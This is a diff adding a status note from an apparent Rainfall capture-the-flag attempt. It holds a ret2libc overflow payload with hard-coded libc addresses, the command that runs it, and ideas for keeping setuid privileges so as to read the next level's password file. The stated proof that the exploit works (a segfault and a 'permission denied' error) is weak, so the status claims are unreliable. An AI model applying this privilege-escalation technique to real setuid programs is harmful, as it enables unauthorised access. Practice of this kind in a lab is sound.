@@ -1,0 +1,31 @@
+EXPLOIT_WORKING_BUT_INCOMPLETE
+
+Current Status:
+- Ret2libc overflow exploit successfully crafted and tested
+- system("/bin/sh") is successfully called
+- However: /bin/sh drops setuid privileges for security
+- Result: Spawned shell runs as level1, not level2
+- Therefore: Cannot read /home/user/level2/.pass
+
+Evidence of working exploit:
+1. Buffer overflow confirmed (exit code 139 = SIGSEGV)
+2. system() confirmed called (received "permission denied" error)
+3. Yet still unable to access level2 files
+
+Solution Path Forward:
+Option A: Use /bin/bash -p flag (preserve privileges)
+Option B: ROP chain to call setuid(0) first
+Option C: Check alternative Rainfall solution approach
+Option D: Create setuid wrapper script in /tmp
+
+Working Payload Code (Python3):
+  import struct
+  payload = b'A'*72
+  payload += struct.pack('<I', 0xb7e6b060)  # system()
+  payload += struct.pack('<I', 0xb7e5ebe0)  # exit()
+  payload += struct.pack('<I', 0xb7f8cc58)  # /bin/sh
+
+Execution:
+  python3 exploit.py | ./level1
+
+See Resources/ directory for complete analysis and testing scripts.
